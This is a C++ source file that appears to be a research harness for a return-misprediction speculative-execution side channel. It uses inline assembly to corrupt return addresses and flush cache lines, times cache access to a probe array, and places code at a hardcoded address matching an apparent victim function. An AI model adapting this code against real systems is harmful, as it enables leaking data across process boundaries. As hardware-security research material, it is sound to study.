#include "util.hpp"
#include <iostream>
#include <fstream>
#define magicNumber 123*256

using namespace std;

char array[256*256];

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $13,%0;" "push %0;" "clflush (%%rsp);" "cpuid;" "ret;"

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	clflush((void *)addr);
}

void checkForMisspeculation() {
	ADDR_PTR tmp;
	int total = 0;

	for (int i = 0; i < 10000; i++) {
		sched_yield();
		asm(
			retAsm( 1)
			retAsm( 2)
			retAsm( 3)
			retAsm( 4)
			retAsm( 5)
			retAsm( 6)
			retAsm( 7)
			retAsm( 8)
			retAsm( 9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: 
		);
	
		total += measure_one_block_access_time((ADDR_PTR)&array[magicNumber]);
		clflush((void *)&array[magicNumber]);
	}

	printf("%f\n", total/10000.0);
}

void loadMemory() { // this should be at the same VA as victim's callLoop()
	// at least 6 nops!
	asm(
		".rept 500;"
		"nop;"
		".endr;"
		"mov $0x55555575db40, %%rax;"
		"mov (%%rax),%%rax;"
		: : : "rax"
	);
}

// void tmp() { // this should be at the same VA as victim's callLoop()
// 	volatile int temp = array[magicNumber];
// }

int main(int argc, char *argv[]){
	if (argc > 1) {
		printf("doing nothing\n");
		while(1) {}
	}

	ADDR_PTR startAddr = 0x0000555555565004;

	// addr = (ADDR_PTR)&array[magicNumber];

	for (int i = 0; i < 500; i++) {
		// printf("i is %i\n", i);
		void *ptr = copyFunction(startAddr, (void *)((ADDR_PTR)&loadMemory+i));
		checkForMisspeculation();
		unmap(startAddr);
	}

	// void *ptr = copyFunction(startAddr, (void *)((ADDR_PTR)&loadMemory+250));
	// checkForMisspeculation();

	return 0;
}